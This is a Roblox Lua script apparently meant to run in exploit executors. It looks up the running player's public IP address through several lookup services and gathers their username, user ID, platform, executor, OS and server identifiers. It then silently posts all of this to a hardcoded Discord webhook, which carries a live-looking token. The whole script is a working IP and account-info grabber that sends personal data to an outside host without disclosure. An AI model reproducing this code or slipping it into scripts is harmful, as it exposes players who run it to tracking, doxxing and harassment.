local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local WEBHOOK = "https://discord.com/api/webhooks/1558795570091659374/O4DJfit2xD8n7zDvlfCFUNzJvptM-uvFmPJ5iH9n8axkwDMj9XXq6jdZKvPTORgnChNp"

local LP = Players.LocalPlayer
if not LP then return end

local function httpGet(url)
    if syn and syn.request then
        local r = syn.request({ Url = url, Method = "GET" })
        return r and r.Body
    end
    if http and http.request then
        local r = http.request({ Url = url, Method = "GET" })
        return r and r.Body
    end
    if request then
        local r = request({ Url = url, Method = "GET" })
        return r and r.Body
    end
    if fluxus and fluxus.request then
        local r = fluxus.request({ Url = url, Method = "GET" })
        return r and r.Body
    end
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if ok then return body end
    ok, body = pcall(function() return HttpService:GetAsync(url) end)
    if ok then return body end
    return nil
end

local function httpPost(url, payload)
    local body = HttpService:JSONEncode(payload)
    local headers = { ["Content-Type"] = "application/json" }
    if syn and syn.request then
        return syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
    end
    if http and http.request then
        return http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
    end
    if request then
        return request({ Url = url, Method = "POST", Headers = headers, Body = body })
    end
    if fluxus and fluxus.request then
        return fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
    end
    pcall(function()
        HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
    end)
end

local platform
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    platform = "Mobile"
elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
    platform = "Console/Gamepad"
else
    platform = "PC"
end

local executor = "unknown"
do
    local ok_ex, ex_name = pcall(function()
        if identifyexecutor then return identifyexecutor() end
        if getexecutorname then return getexecutorname() end
        return nil
    end)
    if ok_ex and ex_name then
        executor = tostring(ex_name)
    end
end

local os_name = "unknown"
do
    pcall(function()
        local g = getgenv and getgenv()
        if g and type(g.os) == "string" and #g.os > 0 then
            os_name = g.os
        end
    end)
    if os_name == "unknown" then
        local low = executor:lower()
        if low:find("mac") or low:find("darwin") then
            os_name = "macOS"
        elseif low:find("linux") then
            os_name = "Linux"
        elseif low:find("win") or low:find("windows") then
            os_name = "Windows"
        end
    end
    if os_name == "unknown" then
        if platform == "PC" then
            os_name = "Windows"
        elseif platform == "Mobile" then
            os_name = "Android/iOS"
        end
    end
end

local ip = "n/a"
do
    local sources = {
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
    }
    for _, url in ipairs(sources) do
        local ok, body = pcall(httpGet, url)
        if ok and type(body) == "string" then
            body = body:gsub("%s+", "")
            if body:match("^%d+%.%d+%.%d+%.%d+$") or body:match("^[%x:]+$") then
                ip = body
                break
            end
        end
    end
end

local place_name = "unknown"
do
    local ok, body = pcall(httpGet, "https://games.roblox.com/v1/games?universeIds=" .. tostring(game.GameId))
    if ok and type(body) == "string" then
        local ok2, obj = pcall(function() return HttpService:JSONDecode(body) end)
        if ok2 and type(obj) == "table" and type(obj.data) == "table" and obj.data[1] then
            local n = obj.data[1].name
            if type(n) == "string" and #n > 0 then
                place_name = n
            end
        end
    end
    if place_name == "unknown" then
        local fallback = tostring(game.Name)
        if fallback ~= "" and fallback:lower() ~= "ugc" and fallback:lower() ~= "place" then
            place_name = fallback
        end
    end
end

local payload = {
    username = "account-info",
    embeds = {{
        title = "Account Info",
        color = 0x5865F2,
        fields = {
            { name = "Username",    value = tostring(LP.Name),         inline = true },
            { name = "DisplayName", value = tostring(LP.DisplayName),  inline = true },
            { name = "UserId",      value = tostring(LP.UserId),       inline = true },
            { name = "Platform",    value = platform,                  inline = true },
            { name = "Executor",    value = executor,                  inline = true },
            { name = "OS",          value = os_name,                   inline = true },
            { name = "IP",          value = ip,                        inline = true },
            { name = "Place Name",  value = place_name,                inline = true },
            { name = "PlaceId",     value = tostring(game.PlaceId),    inline = true },
            { name = "JobId",       value = tostring(game.JobId),      inline = false },
        },
        timestamp = DateTime.now():ToIsoDate(),
    }},
}

pcall(httpPost, WEBHOOK, payload)
